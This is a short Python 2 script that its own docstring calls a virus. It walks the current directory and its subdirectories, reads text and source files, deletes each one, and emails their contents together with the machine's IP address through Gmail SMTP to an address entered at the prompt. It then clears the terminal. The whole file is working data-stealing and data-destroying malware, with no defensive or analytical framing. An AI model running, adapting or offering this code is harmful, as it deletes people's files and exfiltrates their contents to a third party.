import os
import smtplib
import getpass
import socket
import platform
import time

"""This is a virus that infects the current directory and all subdirectores by reading the files and emailing the computer's IP address and file contents. Afterwards, the files are deleted (except for the virus) and the terminal is cleared"""

#Searches the current directory and any subdirectories for .txt, .py, .cxx, .cpp, .h, .m, .template, .js, .html files.
def retrieveFiles(directory):
    list = []
    for dirName, subdirList, fileList in os.walk(directory):
        for file in fileList:
            if file.endswith('.txt') or (file.endswith('.py') and file != 'Virus_Christopher_Yang.py') or file.endswith('.cxx') or file.endswith('.cpp') or file.endswith('.h') or file.endswith('.template')or file.endswith('.js') or file.endswith('.html'):
                if dirName != directory:
                    list.append(os.getcwd() +  dirName[1:] + "/" + file)
                else:
                    list.append(os.getcwd() + "/" + file)
    return list

#Copies the content of each file into a string.
def copyFiles(list):
    msg = ''
    for file in list:
        filehandle = open(file, 'r')
        temp =  file + "\n" + filehandle.read()
        msg += temp + "\n\n"
        filehandle.close()
        os.remove(file)
    return msg


#Sends the email.
def sendMail(msg):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    youremailusername = raw_input("Input your email: ")
    password = getpass.getpass()
    server.login(youremailusername, password)

    target = raw_input("Enter the email of the person who will be receiving the copied files: ")
    server.sendmail(youremailusername, target , msg)

    print "Successfully sent email!\n"

#Clears the terminal
def clear():
    print "Deleting files and clearing screen..."
    time.sleep(2)
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')


IP = socket.gethostbyname(socket.gethostname())
rootDir = '.'
list = retrieveFiles(rootDir)
print "Infecting current directory...\n"
sendMail(IP + "\n\n" + copyFiles(list))
clear()